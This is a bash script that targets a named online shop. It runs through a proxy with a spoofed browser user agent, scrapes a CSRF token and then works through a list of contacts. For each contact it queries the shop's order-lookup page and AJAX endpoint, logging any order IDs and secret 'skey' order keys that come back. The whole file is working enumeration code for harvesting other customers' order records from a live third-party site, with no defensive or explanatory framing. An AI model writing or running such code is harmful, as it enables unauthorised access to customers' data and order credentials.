#!/bin/bash
source /data/config/proxy.env
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASE="https://xuxin66.top/shop"
CK=/tmp/xuxin66_d6d_ck.txt
CONTACTS="${1:-/data/tmp/xuxin66_d6d_contacts.txt}"
rm -f "$CK"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/" -o /tmp/d6d_home.html
echo HOME=$(wc -c </tmp/d6d_home.html)
python3 - <<'PY' > /tmp/d6d_csrf.txt
import re
h=open('/tmp/d6d_home.html',encoding='utf-8',errors='ignore').read()
m=re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"',h)
print(m.group(1) if m else '')
PY
CSRF=$(cat /tmp/d6d_csrf.txt)
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST \
  --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=order")
echo SANITY=$r
n=0
while IFS= read -r c; do
  [ -z "$c" ] && continue
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$c")
  : > /tmp/d6d_q.html
  code=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK -o /tmp/d6d_q.html -w '%{http_code}' --max-time 10 -A "$UA" "$BASE/?mod=query&data=$enc" || echo 000)
  if [ "$code" != "200" ] || [ "$(wc -c </tmp/d6d_q.html)" -lt 1000 ]; then
    echo "FAIL|$c|$code|$(wc -c </tmp/d6d_q.html)"
    # one retry after short sleep
    sleep 0.5
    code=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK -o /tmp/d6d_q.html -w '%{http_code}' --max-time 12 -A "$UA" "$BASE/?mod=query&data=$enc" || echo 000)
  fi
  if [ -s /tmp/d6d_q.html ] && grep -q showOrder /tmp/d6d_q.html; then
    echo "HTMLHIT|$c"
    grep -oE "showOrder\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\)" /tmp/d6d_q.html | head -30
  fi
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/?mod=query" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "qq=$c" --data-urlencode "type=0" --data-urlencode "page=1" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=query" 2>/dev/null || true)
  if echo "$r" | grep -q '"skey"'; then echo "AJAXHIT|$c|$r"; fi
  n=$((n+1))
  [ $((n % 40)) -eq 0 ] && echo "PROG|$n"
  sleep 0.12
done < "$CONTACTS"
echo "QUERY_DONE|$n"
